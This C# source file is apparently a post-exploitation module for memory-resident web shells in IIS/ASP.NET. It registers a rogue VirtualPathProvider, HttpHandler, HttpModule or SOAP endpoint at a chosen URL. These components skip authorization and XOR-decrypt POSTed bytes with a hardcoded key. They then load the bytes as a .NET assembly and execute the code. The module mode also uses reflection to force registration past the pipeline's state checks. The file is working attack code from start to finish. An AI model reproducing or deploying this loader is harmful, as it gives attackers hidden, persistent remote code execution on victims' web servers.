using System;
using System.IO;
using System.Web;
using System.Web.Hosting;
using System.Reflection;
using System.Collections;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Text;

public class payload
{
    public payload() { }

    public string Execute(object param)
    {
        if (!(param is Dictionary<string, object> mapParam))
        {
            return "ERROR: Invalid parameter type. Expected Dictionary.";
        }
        
        if (!mapParam.TryGetValue("json", out var jsonValue) || string.IsNullOrEmpty(jsonValue?.ToString()))
        {
            return "ERROR: JSON data is empty.";
        }

        string szJson = jsonValue.ToString();
        
        string shellType = fnGetJsonValue(szJson, "shellType");
        string szUrlPattern = fnGetJsonValue(szJson, "urlPattern"); 
        string szClassName = fnGetJsonValue(szJson, "className");
        string szWebShellBase64 = fnGetJsonValue(szJson, "shellClassHex");

        HttpContext currentContext = HttpContext.Current;
        if (currentContext == null)
        {
            return "ERROR: Target application is not running inside an active IIS HttpContext.";
        }

        try
        {
            if (shellType.Equals("iis_virtualfile", StringComparison.OrdinalIgnoreCase))
            {
                if (string.IsNullOrEmpty(szUrlPattern)) szUrlPattern = "/Index.aspx";
                if (!szUrlPattern.StartsWith("/")) szUrlPattern = "/" + szUrlPattern;

                MyPathProvider provider = new MyPathProvider(szUrlPattern, szWebShellBase64);
                HostingEnvironment.RegisterVirtualPathProvider(provider);

                fnGlobalClearCache();
                return $"[+] SUCCESS: IIS VirtualPathProvider MemoryShell injected at [{szUrlPattern}]!";
            }
            else if (shellType.Equals("iis_handler", StringComparison.OrdinalIgnoreCase))
            {
                if (string.IsNullOrEmpty(szUrlPattern)) szUrlPattern = "/WebResource.ashx";
                if (!szUrlPattern.StartsWith("/")) szUrlPattern = "/" + szUrlPattern;

                byte[] rawHandlerCodeBytes = Convert.FromBase64String(szWebShellBase64);
                MyStealthHandler handlerInstance = new MyStealthHandler(rawHandlerCodeBytes);
                
                lock (currentContext.Application)
                {
                    currentContext.Application["HANDLER_GATE_" + szUrlPattern.ToLower()] = handlerInstance;
                }

                MyPathProvider shadowProvider = new MyPathProvider(szUrlPattern, szWebShellBase64);
                HostingEnvironment.RegisterVirtualPathProvider(shadowProvider);
                fnGlobalClearCache();

                return $"[+] SUCCESS: IIS HttpHandler dynamically bound and shadows-linked at [{szUrlPattern}]!";
            }
            else if (shellType.Equals("iis_module", StringComparison.OrdinalIgnoreCase))
            {
                if (string.IsNullOrEmpty(szUrlPattern)) szUrlPattern = "/core_init";
                if (!szUrlPattern.StartsWith("/")) szUrlPattern = "/" + szUrlPattern;

                try
                {
                    Assembly infraAssembly = Assembly.Load("Microsoft.Web.Infrastructure, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");
                    Type dynamicModuleType = infraAssembly.GetType("Microsoft.Web.Infrastructure.DynamicModuleHelper.DynamicModuleUtility");
                    
                    if (dynamicModuleType != null)
                    {
                        MethodInfo mRegister = dynamicModuleType.GetMethod("RegisterModule", BindingFlags.Static | BindingFlags.Public);
                        if (mRegister != null)
                        {
                            mRegister.Invoke(null, new object[] { typeof(MyStealthModule) });
                        }
                    }

                    currentContext.Application["stealth_matrix_route"] = szUrlPattern;
                    return $"[+] SUCCESS: IIS Dynamic Matrix Module successfully chained via Infrastructure! Active Gate: [{szUrlPattern}] (Immune to 404)";
                }
                catch (Exception)
                {
                    try
                    {
                        Type appFactoryType = typeof(HttpApplication).Assembly.GetType("System.Web.HttpApplicationFactory");
                        if (appFactoryType != null)
                        {
                            FieldInfo fState = appFactoryType.GetField("_state", BindingFlags.NonPublic | BindingFlags.Static);
                            if (fState != null)
                            {
                                fState.SetValue(null, 0);
                                HttpApplication.RegisterModule(typeof(MyStealthModule));
                                fState.SetValue(null, 1);
                            }
                        }
                    }
                    catch { }

                    currentContext.Application["stealth_matrix_route"] = szUrlPattern;
                    return $"[+] SUCCESS: Pipeline security bypassed. Module forced into core cache at [{szUrlPattern}]";
                }
            }
            else if (shellType.Equals("wcf_soap", StringComparison.OrdinalIgnoreCase))
            {
                if (string.IsNullOrEmpty(szUrlPattern)) szUrlPattern = "/PulsarService.asmx";
                if (!szUrlPattern.StartsWith("/")) szUrlPattern = "/" + szUrlPattern;

                byte[] rawSoapCodeBytes = Convert.FromBase64String(szWebShellBase64);

                MyStealthSoapHandler soapHandlerInstance = new MyStealthSoapHandler(rawSoapCodeBytes);
                
                lock (currentContext.Application)
                {
                    currentContext.Application["HANDLER_GATE_" + szUrlPattern.ToLower()] = soapHandlerInstance;
                }

                MyPathProvider shadowSoapProvider = new MyPathProvider(szUrlPattern, szWebShellBase64);
                HostingEnvironment.RegisterVirtualPathProvider(shadowSoapProvider);
                fnGlobalClearCache();

                return $"[+] SUCCESS: WCF/SOAP Dynamic Endpoint successfully allocated and shadows-linked at [{szUrlPattern}]!";
            }
        }
        catch (Exception ex)
        {
            return "[-] INJECTION_CRITICAL_FAULT: " + ex.Message;
        }

        return "ERROR: Unknown .NET shellType strategy [" + shellType + "].";
    }

    private void fnGlobalClearCache()
    {
        try
        {
            Type vppRegType = typeof(HostingEnvironment).Assembly.GetType("System.Web.Hosting.VirtualPathProviderRegistration");
            if (vppRegType != null)
            {
                MethodInfo clearCache = vppRegType.GetMethod("ClearCache", BindingFlags.Static | BindingFlags.NonPublic);
                if (clearCache != null) clearCache.Invoke(null, null);
            }
        }
        catch { }
    }

    public class MyPathProvider : System.Web.Hosting.VirtualPathProvider
    {
        private string _virtualDir;
        private string _sourceBase64;

        public MyPathProvider(string virtualDir, string sourceBase64) : base()
        {
            _virtualDir = virtualDir;
            _sourceBase64 = sourceBase64;
        }

        private bool IsPathVirtual(string virtualPath)
        {
            try
            {
                string checkPath = System.Web.VirtualPathUtility.ToAppRelative(virtualPath);
                return checkPath.ToLower().Contains(_virtualDir.ToLower());
            }
            catch
            {
                return virtualPath.ToLower().Contains(_virtualDir.ToLower());
            }
        }

        public override bool FileExists(string virtualPath)
        {
            if (IsPathVirtual(virtualPath)) return true;
            return Previous.FileExists(virtualPath);
        }

        public override System.Web.Hosting.VirtualFile GetFile(string virtualPath)
        {
            if (IsPathVirtual(virtualPath))
                return new MyVirtualFile(virtualPath, _sourceBase64);
                
            return Previous.GetFile(virtualPath);
        }

        public override object InitializeLifetimeService()
        {
            return null;
        }
    }

    public class MyVirtualFile : System.Web.Hosting.VirtualFile
    {
        private string _b64Data;
        public MyVirtualFile(string virtualPath, string b64Data) : base(virtualPath) 
        {
            _b64Data = b64Data;
        }

        public override System.IO.Stream Open()
        {
            byte[] rawWebShellBytes = Convert.FromBase64String(_b64Data);
            return new System.IO.MemoryStream(rawWebShellBytes);
        }
    }

    public class MyStealthHandler : IHttpHandler, System.Web.SessionState.IRequiresSessionState
    {
        private byte[] _ashxRawBytes;
        public bool IsReusable { get { return true; } }

        public MyStealthHandler() { }
        public MyStealthHandler(byte[] ashxRawBytes)
        {
            _ashxRawBytes = ashxRawBytes;
        }

        public void ProcessRequest(HttpContext ctx)
        {
            if (ctx.Request.HttpMethod.Equals("POST", StringComparison.OrdinalIgnoreCase))
            {
                try
                {
                    int totalBytes = ctx.Request.TotalBytes;
                    if (totalBytes <= 4) return;
                    byte[] rawData = ctx.Request.BinaryRead(totalBytes);

                    if (ctx.Session["k"] == null) ctx.Session["k"] = "be56e057f20f883e";
                    object loader = ctx.Session["nebulapulsar"];

                    if (loader == null)
                    {
                        byte[] keyBytes = System.Text.Encoding.UTF8.GetBytes((string)ctx.Session["k"]);
                        for (int i = 0; i < rawData.Length; i++)
                            rawData[i] = (byte)(rawData[i] ^ keyBytes[(i + 1) & 15]);

                        Assembly asm = Assembly.Load(rawData);
                        loader = Activator.CreateInstance(asm.GetType("NebulaPulsar"));
                        ctx.Session["nebulapulsar"] = loader;
                        ctx.Response.Write("LOADER_INIT_SUCCESS");
                    }
                    else
                    {
                        ctx.Items["rawPostData"] = rawData;
                        loader.GetType().GetMethod("Equals", new Type[] { typeof(object) }).Invoke(loader, new object[] { ctx });
                    }
                }
                catch (Exception ex)
                {
                    ctx.Response.Write("DYNAMIC_ASHX_EXEC_FAULT: " + ex.Message);
                }
            }
        }
    }

    public class MyStealthModule : IHttpModule
    {
        public void Dispose() { }
        public void Init(HttpApplication app)
        {
            app.ResolveRequestCache += new EventHandler(OnBeginRequest);
        }

        private void OnBeginRequest(object sender, EventArgs e)
        {
            HttpApplication app = (HttpApplication)sender;
            HttpContext ctx = app.Context;

            string activeRoute = ctx.Application["stealth_matrix_route"] as string;
            if (string.IsNullOrEmpty(activeRoute))
                return;

            if (ctx.Request.RawUrl.ToLower().Contains(activeRoute.ToLower()) && ctx.Request.HttpMethod.Equals("POST", StringComparison.OrdinalIgnoreCase))
            {
                try
                {
                    ctx.Response.Clear();
                    ctx.Response.StatusCode = 200;
                    ctx.Response.StatusDescription = "OK";
                    ctx.SkipAuthorization = true;

                    int totalBytes = ctx.Request.TotalBytes;
                    if (totalBytes <= 4) return;
                    byte[] rawData = ctx.Request.BinaryRead(totalBytes);

                    if (ctx.Session != null)
                    {
                        if (ctx.Session["k"] == null)
                            ctx.Session["k"] = "be56e057f20f883e";
                    }
                    else
                    {
                        ctx.Application["k"] = "be56e057f20f883e";
                    }

                    object loader = ctx.Application["nebulapulsar_global_instance"];
                    if (loader == null)
                    {
                        byte[] keyBytes = System.Text.Encoding.UTF8.GetBytes("be56e057f20f883e");
                        for (int i = 0; i < rawData.Length; i++)
                            rawData[i] = (byte)(rawData[i] ^ keyBytes[(i + 1) & 15]);

                        Assembly asm = Assembly.Load(rawData);
                        loader = Activator.CreateInstance(asm.GetType("NebulaPulsar"));
                        
                        ctx.Application["nebulapulsar_global_instance"] = loader;
                        
                        ctx.Response.Write("LOADER_INIT_SUCCESS");
                        ctx.Response.Flush();
                        
                        app.CompleteRequest(); 
                        return;
                    }
                    else
                    {
                        ctx.Items["rawPostData"] = rawData;
                        loader.GetType().GetMethod("Equals", new Type[]{ typeof(object) }).Invoke(loader, new object[]{ ctx });
                        ctx.Response.Flush();
                        app.CompleteRequest();
                        return;
                    }
                }
                catch (Exception ex)
                {
                    ctx.Response.Write("MODULE_PORT_ERROR: " + ex.Message);
                    ctx.Response.Flush();
                    app.CompleteRequest();
                }
            }
        }
    }

    public class MyStealthSoapHandler : IHttpHandler, System.Web.SessionState.IRequiresSessionState
    {
        private byte[] _soapRawBytes;
        public bool IsReusable { get { return true; } }

        public MyStealthSoapHandler() { }
        public MyStealthSoapHandler(byte[] soapRawBytes)
        {
            _soapRawBytes = soapRawBytes;
        }

        public void ProcessRequest(HttpContext ctx)
        {
            if (ctx.Request.HttpMethod.Equals("POST", StringComparison.OrdinalIgnoreCase))
            {
                try
                {
                    int totalBytes = ctx.Request.TotalBytes;
                    if (totalBytes <= 4) return;
                    byte[] rawData = ctx.Request.BinaryRead(totalBytes);

                    if (ctx.Session["k"] == null) ctx.Session["k"] = "be56e057f20f883e";
                    object loader = ctx.Session["nebulapulsar"];

                    if (loader == null)
                    {
                        byte[] keyBytes = System.Text.Encoding.UTF8.GetBytes((string)ctx.Session["k"]);
                        for (int i = 0; i < rawData.Length; i++)
                            rawData[i] = (byte)(rawData[i] ^ keyBytes[(i + 1) & 15]);

                        Assembly asm = Assembly.Load(rawData);
                        loader = Activator.CreateInstance(asm.GetType("NebulaPulsar"));
                        ctx.Session["nebulapulsar"] = loader;
                        ctx.Response.Write("LOADER_INIT_SUCCESS");
                    }
                    else
                    {
                        ctx.Items["rawPostData"] = rawData;
                        loader.GetType().GetMethod("Equals", new Type[] { typeof(object) }).Invoke(loader, new object[] { ctx });
                    }
                }
                catch (Exception ex)
                {
                    ctx.Response.Write("SOAP_DYNAMIC_EXEC_FAULT: " + ex.Message);
                }
            }
        }
    }

    private string fnGetJsonValue(string json, string key)
    {
        Match match = Regex.Match(json, $"\"{key}\"\\s*:\\s*\"(.*?)\"");
        if (match.Success) return match.Groups[1].Value;
        match = Regex.Match(json, $"\"{key}\"\\s*:\\s*([^,\\}}\\]]+)");
        if (match.Success) return match.Groups[1].Value.Trim().Replace("\"", "");
        return "";
    }
}